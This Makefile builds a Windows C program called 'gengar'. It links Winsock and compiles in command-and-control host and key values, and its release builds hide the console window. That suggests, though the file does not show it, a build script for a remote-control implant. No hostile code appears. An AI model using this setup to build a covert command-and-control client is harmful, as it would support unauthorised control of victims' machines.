debug:
	gcc -Wall *.c -o gengar -lws2_32 -DCNC_KEY=\"${CNC_KEY}\" -DGENGAR_KEY=\"${GENGAR_KEY}\"

release:
	gcc -Wall *.c -o gengar -lws2_32 -mwindows -DCNC_KEY=\"${CNC_KEY}\" -DGENGAR_KEY=\"${GENGAR_KEY}\"

release_host:
	gcc -Wall *.c -o gengar -lws2_32 -mwindows -DCNC_HOST=\"${CNC_HOST}\" -DCNC_KEY=\"${CNC_KEY}\" -DGENGAR_KEY=\"${GENGAR_KEY}\"
